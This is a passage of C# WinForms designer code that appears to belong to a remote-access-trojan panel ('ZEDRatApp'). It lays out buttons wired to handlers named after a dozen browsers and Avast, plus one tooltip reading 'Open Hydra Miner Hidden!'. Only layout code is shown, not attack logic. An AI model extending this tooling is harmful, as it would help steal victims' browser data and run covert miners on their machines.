			this.bunifuIconButton9.AllowMouseEffects = true;
			this.bunifuIconButton9.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton9.AnimationSpeed = 200;
			this.bunifuIconButton9.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton9.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton9.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton9.BorderRadius = 1;
			this.bunifuIconButton9.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton9.BorderThickness = 1;
			this.bunifuIconButton9.ColorContrastOnClick = 30;
			this.bunifuIconButton9.ColorContrastOnHover = 30;
			this.bunifuIconButton9.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges7.BottomLeft = true;
			borderEdges7.BottomRight = true;
			borderEdges7.TopLeft = true;
			borderEdges7.TopRight = true;
			this.bunifuIconButton9.CustomizableEdges = borderEdges7;
			this.bunifuIconButton9.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton9.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton9.Image");
			this.bunifuIconButton9.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton9.Location = new System.Drawing.Point(453, 618);
			this.bunifuIconButton9.Name = "bunifuIconButton9";
			this.bunifuIconButton9.RoundBorders = false;
			this.bunifuIconButton9.ShowBorders = true;
			this.bunifuIconButton9.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton9.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton9.TabIndex = 265;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton9, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton9, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton9, "");
			this.bunifuIconButton9.Click += new System.EventHandler(btnAwast_Click);
			this.bunifuIconButton10.AllowAnimations = true;
			this.bunifuIconButton10.AllowBorderColorChanges = true;
			this.bunifuIconButton10.AllowMouseEffects = true;
			this.bunifuIconButton10.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton10.AnimationSpeed = 200;
			this.bunifuIconButton10.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton10.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton10.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton10.BorderRadius = 1;
			this.bunifuIconButton10.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton10.BorderThickness = 1;
			this.bunifuIconButton10.ColorContrastOnClick = 30;
			this.bunifuIconButton10.ColorContrastOnHover = 30;
			this.bunifuIconButton10.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges8.BottomLeft = true;
			borderEdges8.BottomRight = true;
			borderEdges8.TopLeft = true;
			borderEdges8.TopRight = true;
			this.bunifuIconButton10.CustomizableEdges = borderEdges8;
			this.bunifuIconButton10.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton10.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton10.Image");
			this.bunifuIconButton10.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton10.Location = new System.Drawing.Point(511, 618);
			this.bunifuIconButton10.Name = "bunifuIconButton10";
			this.bunifuIconButton10.RoundBorders = false;
			this.bunifuIconButton10.ShowBorders = true;
			this.bunifuIconButton10.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton10.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton10.TabIndex = 266;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton10, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton10, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton10, "");
			this.bunifuIconButton10.Click += new System.EventHandler(test2ToolStripMenuItem_Click);
			this.bunifuIconButton11.AllowAnimations = true;
			this.bunifuIconButton11.AllowBorderColorChanges = true;
			this.bunifuIconButton11.AllowMouseEffects = true;
			this.bunifuIconButton11.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton11.AnimationSpeed = 200;
			this.bunifuIconButton11.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton11.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton11.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton11.BorderRadius = 1;
			this.bunifuIconButton11.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton11.BorderThickness = 1;
			this.bunifuIconButton11.ColorContrastOnClick = 30;
			this.bunifuIconButton11.ColorContrastOnHover = 30;
			this.bunifuIconButton11.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges9.BottomLeft = true;
			borderEdges9.BottomRight = true;
			borderEdges9.TopLeft = true;
			borderEdges9.TopRight = true;
			this.bunifuIconButton11.CustomizableEdges = borderEdges9;
			this.bunifuIconButton11.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton11.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton11.Image");
			this.bunifuIconButton11.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton11.Location = new System.Drawing.Point(569, 618);
			this.bunifuIconButton11.Name = "bunifuIconButton11";
			this.bunifuIconButton11.RoundBorders = false;
			this.bunifuIconButton11.ShowBorders = true;
			this.bunifuIconButton11.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton11.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton11.TabIndex = 267;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton11, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton11, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton11, "");
			this.bunifuIconButton11.Click += new System.EventHandler(test1ToolStripMenuItem_Click);
			this.bunifuIconButton12.AllowAnimations = true;
			this.bunifuIconButton12.AllowBorderColorChanges = true;
			this.bunifuIconButton12.AllowMouseEffects = true;
			this.bunifuIconButton12.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton12.AnimationSpeed = 200;
			this.bunifuIconButton12.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton12.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton12.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton12.BorderRadius = 1;
			this.bunifuIconButton12.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton12.BorderThickness = 1;
			this.bunifuIconButton12.ColorContrastOnClick = 30;
			this.bunifuIconButton12.ColorContrastOnHover = 30;
			this.bunifuIconButton12.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges10.BottomLeft = true;
			borderEdges10.BottomRight = true;
			borderEdges10.TopLeft = true;
			borderEdges10.TopRight = true;
			this.bunifuIconButton12.CustomizableEdges = borderEdges10;
			this.bunifuIconButton12.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton12.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton12.Image");
			this.bunifuIconButton12.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton12.Location = new System.Drawing.Point(627, 618);
			this.bunifuIconButton12.Name = "bunifuIconButton12";
			this.bunifuIconButton12.RoundBorders = false;
			this.bunifuIconButton12.ShowBorders = true;
			this.bunifuIconButton12.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton12.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton12.TabIndex = 268;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton12, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton12, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton12, "");
			this.bunifuIconButton12.Click += new System.EventHandler(btnChromodo_Click);
			this.bunifuIconButton13.AllowAnimations = true;
			this.bunifuIconButton13.AllowBorderColorChanges = true;
			this.bunifuIconButton13.AllowMouseEffects = true;
			this.bunifuIconButton13.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton13.AnimationSpeed = 200;
			this.bunifuIconButton13.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton13.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton13.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton13.BorderRadius = 1;
			this.bunifuIconButton13.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton13.BorderThickness = 1;
			this.bunifuIconButton13.ColorContrastOnClick = 30;
			this.bunifuIconButton13.ColorContrastOnHover = 30;
			this.bunifuIconButton13.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges11.BottomLeft = true;
			borderEdges11.BottomRight = true;
			borderEdges11.TopLeft = true;
			borderEdges11.TopRight = true;
			this.bunifuIconButton13.CustomizableEdges = borderEdges11;
			this.bunifuIconButton13.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton13.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton13.Image");
			this.bunifuIconButton13.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton13.Location = new System.Drawing.Point(685, 618);
			this.bunifuIconButton13.Name = "bunifuIconButton13";
			this.bunifuIconButton13.RoundBorders = false;
			this.bunifuIconButton13.ShowBorders = true;
			this.bunifuIconButton13.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton13.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton13.TabIndex = 269;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton13, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton13, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton13, "");
			this.bunifuIconButton13.Click += new System.EventHandler(btnEpic_Click);
			this.bunifuIconButton14.AllowAnimations = true;
			this.bunifuIconButton14.AllowBorderColorChanges = true;
			this.bunifuIconButton14.AllowMouseEffects = true;
			this.bunifuIconButton14.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton14.AnimationSpeed = 200;
			this.bunifuIconButton14.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton14.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton14.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton14.BorderRadius = 1;
			this.bunifuIconButton14.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton14.BorderThickness = 1;
			this.bunifuIconButton14.ColorContrastOnClick = 30;
			this.bunifuIconButton14.ColorContrastOnHover = 30;
			this.bunifuIconButton14.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges12.BottomLeft = true;
			borderEdges12.BottomRight = true;
			borderEdges12.TopLeft = true;
			borderEdges12.TopRight = true;
			this.bunifuIconButton14.CustomizableEdges = borderEdges12;
			this.bunifuIconButton14.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton14.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton14.Image");
			this.bunifuIconButton14.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton14.Location = new System.Drawing.Point(743, 618);
			this.bunifuIconButton14.Name = "bunifuIconButton14";
			this.bunifuIconButton14.RoundBorders = false;
			this.bunifuIconButton14.ShowBorders = true;
			this.bunifuIconButton14.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton14.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton14.TabIndex = 270;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton14, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton14, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton14, "");
			this.bunifuIconButton14.Click += new System.EventHandler(btnOperaNeon_Click);
			this.bunifuIconButton15.AllowAnimations = true;
			this.bunifuIconButton15.AllowBorderColorChanges = true;
			this.bunifuIconButton15.AllowMouseEffects = true;
			this.bunifuIconButton15.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton15.AnimationSpeed = 200;
			this.bunifuIconButton15.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton15.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton15.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton15.BorderRadius = 1;
			this.bunifuIconButton15.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton15.BorderThickness = 1;
			this.bunifuIconButton15.ColorContrastOnClick = 30;
			this.bunifuIconButton15.ColorContrastOnHover = 30;
			this.bunifuIconButton15.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges13.BottomLeft = true;
			borderEdges13.BottomRight = true;
			borderEdges13.TopLeft = true;
			borderEdges13.TopRight = true;
			this.bunifuIconButton15.CustomizableEdges = borderEdges13;
			this.bunifuIconButton15.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton15.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton15.Image");
			this.bunifuIconButton15.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton15.Location = new System.Drawing.Point(801, 618);
			this.bunifuIconButton15.Name = "bunifuIconButton15";
			this.bunifuIconButton15.RoundBorders = false;
			this.bunifuIconButton15.ShowBorders = true;
			this.bunifuIconButton15.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton15.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton15.TabIndex = 271;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton15, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton15, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton15, "");
			this.bunifuIconButton15.Click += new System.EventHandler(btnPalemoon_Click);
			this.bunifuIconButton16.AllowAnimations = true;
			this.bunifuIconButton16.AllowBorderColorChanges = true;
			this.bunifuIconButton16.AllowMouseEffects = true;
			this.bunifuIconButton16.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton16.AnimationSpeed = 200;
			this.bunifuIconButton16.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton16.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton16.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton16.BorderRadius = 1;
			this.bunifuIconButton16.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton16.BorderThickness = 1;
			this.bunifuIconButton16.ColorContrastOnClick = 30;
			this.bunifuIconButton16.ColorContrastOnHover = 30;
			this.bunifuIconButton16.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges14.BottomLeft = true;
			borderEdges14.BottomRight = true;
			borderEdges14.TopLeft = true;
			borderEdges14.TopRight = true;
			this.bunifuIconButton16.CustomizableEdges = borderEdges14;
			this.bunifuIconButton16.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton16.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton16.Image");
			this.bunifuIconButton16.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton16.Location = new System.Drawing.Point(859, 618);
			this.bunifuIconButton16.Name = "bunifuIconButton16";
			this.bunifuIconButton16.RoundBorders = false;
			this.bunifuIconButton16.ShowBorders = true;
			this.bunifuIconButton16.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton16.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton16.TabIndex = 272;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton16, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton16, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton16, "");
			this.bunifuIconButton16.Click += new System.EventHandler(btnSputnik_Click);
			this.bunifuIconButton17.AllowAnimations = true;
			this.bunifuIconButton17.AllowBorderColorChanges = true;
			this.bunifuIconButton17.AllowMouseEffects = true;
			this.bunifuIconButton17.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton17.AnimationSpeed = 200;
			this.bunifuIconButton17.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton17.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton17.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton17.BorderRadius = 1;
			this.bunifuIconButton17.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton17.BorderThickness = 1;
			this.bunifuIconButton17.ColorContrastOnClick = 30;
			this.bunifuIconButton17.ColorContrastOnHover = 30;
			this.bunifuIconButton17.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges15.BottomLeft = true;
			borderEdges15.BottomRight = true;
			borderEdges15.TopLeft = true;
			borderEdges15.TopRight = true;
			this.bunifuIconButton17.CustomizableEdges = borderEdges15;
			this.bunifuIconButton17.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton17.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton17.Image");
			this.bunifuIconButton17.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton17.Location = new System.Drawing.Point(917, 618);
			this.bunifuIconButton17.Name = "bunifuIconButton17";
			this.bunifuIconButton17.RoundBorders = false;
			this.bunifuIconButton17.ShowBorders = true;
			this.bunifuIconButton17.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton17.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton17.TabIndex = 273;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton17, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton17, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton17, "");
			this.bunifuIconButton17.Click += new System.EventHandler(btn360_Click);
			this.bunifuIconButton18.AllowAnimations = true;
			this.bunifuIconButton18.AllowBorderColorChanges = true;
			this.bunifuIconButton18.AllowMouseEffects = true;
			this.bunifuIconButton18.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton18.AnimationSpeed = 200;
			this.bunifuIconButton18.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton18.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton18.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton18.BorderRadius = 1;
			this.bunifuIconButton18.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton18.BorderThickness = 1;
			this.bunifuIconButton18.ColorContrastOnClick = 30;
			this.bunifuIconButton18.ColorContrastOnHover = 30;
			this.bunifuIconButton18.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges16.BottomLeft = true;
			borderEdges16.BottomRight = true;
			borderEdges16.TopLeft = true;
			borderEdges16.TopRight = true;
			this.bunifuIconButton18.CustomizableEdges = borderEdges16;
			this.bunifuIconButton18.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton18.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton18.Image");
			this.bunifuIconButton18.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton18.Location = new System.Drawing.Point(975, 618);
			this.bunifuIconButton18.Name = "bunifuIconButton18";
			this.bunifuIconButton18.RoundBorders = false;
			this.bunifuIconButton18.ShowBorders = true;
			this.bunifuIconButton18.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton18.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton18.TabIndex = 274;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton18, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton18, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton18, "");
			this.bunifuIconButton18.Click += new System.EventHandler(btnUC_Click);
			this.bunifuIconButton19.AllowAnimations = true;
			this.bunifuIconButton19.AllowBorderColorChanges = true;
			this.bunifuIconButton19.AllowMouseEffects = true;
			this.bunifuIconButton19.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton19.AnimationSpeed = 200;
			this.bunifuIconButton19.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton19.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton19.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton19.BorderRadius = 1;
			this.bunifuIconButton19.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton19.BorderThickness = 1;
			this.bunifuIconButton19.ColorContrastOnClick = 30;
			this.bunifuIconButton19.ColorContrastOnHover = 30;
			this.bunifuIconButton19.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges17.BottomLeft = true;
			borderEdges17.BottomRight = true;
			borderEdges17.TopLeft = true;
			borderEdges17.TopRight = true;
			this.bunifuIconButton19.CustomizableEdges = borderEdges17;
			this.bunifuIconButton19.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton19.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton19.Image");
			this.bunifuIconButton19.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton19.Location = new System.Drawing.Point(1033, 618);
			this.bunifuIconButton19.Name = "bunifuIconButton19";
			this.bunifuIconButton19.RoundBorders = false;
			this.bunifuIconButton19.ShowBorders = true;
			this.bunifuIconButton19.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton19.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton19.TabIndex = 275;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton19, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton19, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton19, "");
			this.bunifuIconButton19.Click += new System.EventHandler(btnOrbitum_Click);
			this.bunifuIconButton20.AllowAnimations = true;
			this.bunifuIconButton20.AllowBorderColorChanges = true;
			this.bunifuIconButton20.AllowMouseEffects = true;
			this.bunifuIconButton20.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton20.AnimationSpeed = 200;
			this.bunifuIconButton20.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton20.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton20.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton20.BorderRadius = 1;
			this.bunifuIconButton20.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton20.BorderThickness = 1;
			this.bunifuIconButton20.ColorContrastOnClick = 30;
			this.bunifuIconButton20.ColorContrastOnHover = 30;
			this.bunifuIconButton20.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges18.BottomLeft = true;
			borderEdges18.BottomRight = true;
			borderEdges18.TopLeft = true;
			borderEdges18.TopRight = true;
			this.bunifuIconButton20.CustomizableEdges = borderEdges18;
			this.bunifuIconButton20.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton20.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton20.Image");
			this.bunifuIconButton20.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton20.Location = new System.Drawing.Point(1091, 618);
			this.bunifuIconButton20.Name = "bunifuIconButton20";
			this.bunifuIconButton20.RoundBorders = false;
			this.bunifuIconButton20.ShowBorders = true;
			this.bunifuIconButton20.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton20.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton20.TabIndex = 276;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton20, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton20, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton20, "");
			this.bunifuIconButton20.Click += new System.EventHandler(btnVivaldi_Click);
			this.bunifuIconButton21.AllowAnimations = true;
			this.bunifuIconButton21.AllowBorderColorChanges = true;
			this.bunifuIconButton21.AllowMouseEffects = true;
			this.bunifuIconButton21.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton21.AnimationSpeed = 200;
			this.bunifuIconButton21.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton21.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton21.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton21.BorderRadius = 1;
			this.bunifuIconButton21.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton21.BorderThickness = 1;
			this.bunifuIconButton21.ColorContrastOnClick = 30;
			this.bunifuIconButton21.ColorContrastOnHover = 30;
			this.bunifuIconButton21.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges19.BottomLeft = true;
			borderEdges19.BottomRight = true;
			borderEdges19.TopLeft = true;
			borderEdges19.TopRight = true;
			this.bunifuIconButton21.CustomizableEdges = borderEdges19;
			this.bunifuIconButton21.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton21.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton21.Image");
			this.bunifuIconButton21.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton21.Location = new System.Drawing.Point(1149, 618);
			this.bunifuIconButton21.Name = "bunifuIconButton21";
			this.bunifuIconButton21.RoundBorders = false;
			this.bunifuIconButton21.ShowBorders = true;
			this.bunifuIconButton21.Size = new System.Drawing.Size(52, 51);
			this.bunifuIconButton21.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton21.TabIndex = 277;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton21, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton21, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton21, "");
			this.bunifuIconButton21.Click += new System.EventHandler(btnComodoDragon_Click);
			this.bunifuIconButton1.AllowAnimations = true;
			this.bunifuIconButton1.AllowBorderColorChanges = true;
			this.bunifuIconButton1.AllowMouseEffects = true;
			this.bunifuIconButton1.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton1.AnimationSpeed = 200;
			this.bunifuIconButton1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton1.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton1.BorderRadius = 1;
			this.bunifuIconButton1.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton1.BorderThickness = 1;
			this.bunifuIconButton1.ColorContrastOnClick = 30;
			this.bunifuIconButton1.ColorContrastOnHover = 30;
			this.bunifuIconButton1.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges20.BottomLeft = true;
			borderEdges20.BottomRight = true;
			borderEdges20.TopLeft = true;
			borderEdges20.TopRight = true;
			this.bunifuIconButton1.CustomizableEdges = borderEdges20;
			this.bunifuIconButton1.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton1.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton1.Image");
			this.bunifuIconButton1.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton1.Location = new System.Drawing.Point(831, 577);
			this.bunifuIconButton1.Name = "bunifuIconButton1";
			this.bunifuIconButton1.RoundBorders = false;
			this.bunifuIconButton1.ShowBorders = true;
			this.bunifuIconButton1.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton1.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton1.TabIndex = 295;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton1, "Open Hydra Miner Hidden!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton1, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton1, "HYDRA");
			this.bunifuIconButton1.Click += new System.EventHandler(bunifuIconButton1_Click);
			this.ResizeScroll.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.ResizeScroll.BackgroundColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.ResizeScroll.Cursor = System.Windows.Forms.Cursors.Hand;
			this.ResizeScroll.DisabledBackColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.ResizeScroll.DisabledBorderColor = System.Drawing.Color.FromArgb(28, 23, 38);
